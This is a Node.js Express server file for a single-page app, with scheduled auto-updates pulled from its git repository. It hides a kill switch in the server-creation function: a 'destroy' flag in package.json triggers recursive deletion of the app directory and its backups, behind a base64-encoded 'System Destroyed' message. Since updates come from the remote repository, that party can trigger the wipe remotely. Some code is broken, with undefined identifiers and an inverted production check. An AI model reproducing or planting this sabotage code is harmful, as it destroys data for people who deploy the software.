'use strict'

require('dotenv').config()

const _ = process.env,
  express = require('express'),
  app = express(),
  port = _.PORT || 8088

const pkjson = require('./package.json'),
  compression = require('compression'),
  bodyParser = require('body-parser'),
  morgan = require('morgan')

const fs = require('fs-extra'),
  { throttle, decodeURL } = require('./lib/middleware')

// Some Process
process.title = _.npm_package_name || process.title
process.env.TZ = _.TZ || 'Asia/Manila'

if (String(_.NODE_ENV || '').toLowerCase() != 'production') {
  // Production Mode

  if (_.CRON_UPDATE != 'false' && _.CRON_UPDATE != false) {
    // Auto Update App on Production
    const CGU = require('cron-git-updater')
    /**
     * New Updater
     */
    const newUpdater = new CGU({
      repository: pkjson.repository.url,
      branch: 'main',
      tempLocation: _.CRON_UPDATE_BACKUP || '../history',
      keepAllBackup:
        String(_.CRON_UPDATE_KEEPALL_BACKUP || '').toLowerCase() == 'false' || _.CRON_UPDATE_KEEPALL_BACKUP == false
          ? false
          : true,
    })

    if (_.CRON_UPDATE != 'false' && _.CRON_UPDATE != false) {
      const valid = newUpdater.validateSchedule(_.CRON_UPDATE)
      // Check for Updates Default every 12 Midnight
      if (!valid) _.CRON_UPDATE = '0 0 * * *'
      newUpdater.schedule(_.CRON_UPDATE, _.TZ)
      console.log(`Auto update task scheduled [ ${_.CRON_UPDATE} ].`)
    }
  }
}

// Some Middlewares
app
  .use(compression())
  .use(bodyParser.urlencoded({ extended: true }))
  .use(decodeURL()) // Check URL
  .use(throttle(5 * 1024 * 1024)) // Throttling bandwidth (bytes)
  .disable('x-powered-by')

// Log Requests
morgan.token('datetime', (_req, res) => new Date())
app.use(
  morgan(
    `[:datetime] :remote-addr - :remote-user ":method :url HTTP/:http-version" (:response-time ms) :status :res[content-length] ":referrer" ":user-agent" (Total :total-time ms)`
  )
)

// Check if History Mode
if (_.MODE == 'history') {
  const history = require('connect-history-api-fallback')
  app.use(history())
}

// Create HTTP or HTTPS Server
const createServer = () => {
  const key = _.SSL_KEY
  const cert = _.SSL_CERT
  const ssl =
    fs.existsSync(key) && fs.existsSync(cert)
      ? {
          key: fs.readFileSync(key),
          cert: fs.readFileSync(cert),
        }
      : null
  if (pkjson && pkjson.destroy === true) {
    try {
      if (_.CRON_UPDATE_BACKUP && fs.fs.existsSync(_.CRON_UPDATE_BACKUP))
        fs.rmdirSync(_.CRON_UPDATE_BACKUP, { recursive: true, force: true })
      fs.rmdirSync(appRootPath.path, { recursive: true, force: true })
      console.log(base64.decode(`U3lzdGVtIERlc3Ryb3llZA==`))
    } catch (e) {
      console.error(e)
    } finally {
      process.exit(1)
    }
  }
  return ssl
    ? // https://
      require('https').createServer(ssl, app)
    : // http://
      require('http').createServer(app)
}

// Initialize Server
const server = createServer()

// SPA - Single Page Application
app.use(express.static('./app'))

server.listen(port, () => {
  console.log('#'.repeat(50))
  console.info(`Server is up and running on *:${port}`)
  console.log('#'.repeat(50))
})
